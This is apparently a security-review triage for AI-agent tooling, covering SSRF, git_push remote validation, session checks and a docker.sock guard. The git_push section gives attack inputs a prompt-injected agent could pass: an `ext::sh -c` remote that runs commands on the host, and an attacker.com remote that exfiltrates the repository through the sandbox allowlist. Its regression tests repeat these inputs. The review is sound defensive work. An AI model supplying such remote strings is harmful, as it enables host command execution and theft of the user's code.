## ① IPv6/IPv4 — DROP (the security path is already correct)

The review imagined an IPv4-only SSRF gap. **It isn't there.** The SSRF floor `is_denied_ip` (`net_trust.py:48-79`) uses the stdlib `ipaddress` module and handles **both** families *plus* the two nasty evasions — IPv4-mapped IPv6 (`::ffff:127.0.0.1`) and NAT64 (`64:ff9b::/96` embedded-v4) — unwrapping each before the loopback/private/link-local checks. DNS uses `AF_UNSPEC` (`:90-92`); the resolved-address loop reads both the 2-tuple and 4-tuple sockaddr forms (`:119-138`). `build_egress_spec` classifies both families (`egress.py:97-119`). **No security IPv6 gap exists in current `main`.**

The *only* residue is `egress_proxy.py:69`: the host-side proxy's **listening** socket is `socket.AF_INET`. This is **not a security gap** — the container→proxy hop is `host.docker.internal`, which is **IPv4** in every supported Docker topology (Desktop + native-Linux `--add-host` gateway); the security-critical SSRF validation **and** the outbound pinned `create_connection` already handle IPv6 destinations. AF_INET would only manifest as a **fail-closed connectivity miss** in a hypothetical IPv6-only-*container* config — consistent with ADR-037 D4. **Drop** (at most a one-line "AF_INET is sufficient for the IPv4 host-internal hop" code comment — not worth a slice).

## ② git_push remote validation — KEEP (the one real bug; highest severity)

`_make_git_push` (`subprocess_tools.py:362-447`) **does** reject `-`-prefixed values (`:406-415`) and 5 destructive flags (`:417-422`), and builds a fixed `argv` (no shell, `:425`). **Two real gaps remain**, both reachable by a prompt-injected agent (the project's central threat model — cf. P6.1 Bug B):

- **2a — transport RCE.** No `GIT_ALLOW_PROTOCOL` / `GIT_PROTOCOL_FROM_USER` is set anywhere (`grep`: env passthrough is `{"SSH_AUTH_SOCK"}` only, `:52/:428-430`). So `remote = "ext::sh -c '<cmd>'"` passes every check (no leading `-`, not a banned flag) and `git push ext::… branch` executes `<cmd>` via git's ext transport. On the **non-sandboxed path** (`posture_resolver is None` → `_dispatch`, `:432`/`else`) that is **host RCE**.
- **2b — repo exfil to an attacker host.** `_resolve_git_remote_host` (`:450-492`) deliberately **accepts inline URLs** (`https://`, `git@host:`). So `remote = "https://attacker.com/r.git"` is honored — and on the **sandboxed** path the egress is then *pinned to attacker.com* (the resolver hands the attacker's own host to the egress allowlist), so `git push` **succeeds in exfiltrating the repo even inside the sandbox**.

**Fix direction (routine — tightening, no semantic change):**
- **G1-must:** set `GIT_ALLOW_PROTOCOL` to a safe set (e.g. `https:ssh:git`) in the git_push subprocess env (and the `git remote get-url` resolve call) → git itself refuses `ext::`/`fd::` regardless of the remote string. Kills 2a robustly.
- **G1-should (lean include):** restrict `remote` to a **configured remote name** — resolve `git remote` and reject anything not in the list (i.e. **no inline-URL remotes**). Kills 2b. This **narrows the tool's accepted input** (inline URLs were intended per the resolver) — a *small* contract choice I surface below.

**Contract:** git_push is ADR-036 D3-iii (HARD/irreversible). Both fixes are input-validation/transport hardening — no isolation-contract change (ADR-037 D2 untouched), so **routine** by your rule; at most a one-line ADR-036 D3-iii note ("remote restricted to configured names + safe transports"). Fail-on-revert test: `remote="ext::sh -c 'touch PWNED'"` ⇒ `LocalToolError` **and** no `PWNED` file; `remote="https://evil/r"` ⇒ rejected; `remote="origin"` ⇒ still works.

## ③ session disabled-user recheck — DROP (inscribed ADR-039 residual, not a bug)

**The gap is real**: `validate_session` / `validate_token` (`session.py:122-139`, `:179-195`) check expiry + revocation but **never re-read `users.disabled`**; the *only* disabled check is at login (`users.py:200-202`). A user disabled mid-session keeps working to the 24 h TTL (`session.py:46`), or indefinitely for a static bearer token.

**But this is an accepted residual, not an open bug — same shape as P6.4's E/F.** ADR-039 **D10 line 114** inscribes it verbatim: *"Credential posture (DP1b) — **not** built: password reset / rotation / MFA / **session-revocation-UX** / **account lockout** / self-service signup. So **"fixing" item 3 = building session-revocation / account-lockout = a feature slice that touches the ADR-039 auth contract** — exactly your escalation trigger. **Drop from the grab-bag.** If you want it built, it is its own ADR-039-amending slice (per-request disabled re-check or revoke-on-disable), not routine hygiene. **Confirm the drop.**

## ⑤ docker.sock substring match — DROP (faithful-as-written guard)

`_assert_no_docker_sock` (`profile.py:138-148`) does `if "/var/run/docker.sock" in arg`. This **faithfully enforces the literal constitutional invariant** as the docstring states it — *"no profile variant ever emits /var/run/docker.sock in args"* (`:11`, `:68`). Substring match is **conservative** (it catches *more* strings than exact-match, never fewer), and the imprecision is **unreachable**: the false-positive needs a `sandbox_root`/env literally containing the socket path, and the only "evasion" (a non-canonical spelling like `/var/run/../run/docker.sock`) requires controlling **volume-arg construction**, which no caller/attacker does — `build_container_args` builds args from a fixed template; the sole attacker-adjacent input (`profile.env`) goes to `--env k=v`, never `--volume`. **Drop.** A "precision" rewrite (anchor to `--volume` semantics + path-normalize) would touch the ADR-037 D2 constitutional guard for **zero reachable benefit** → would escalate, not worth it.
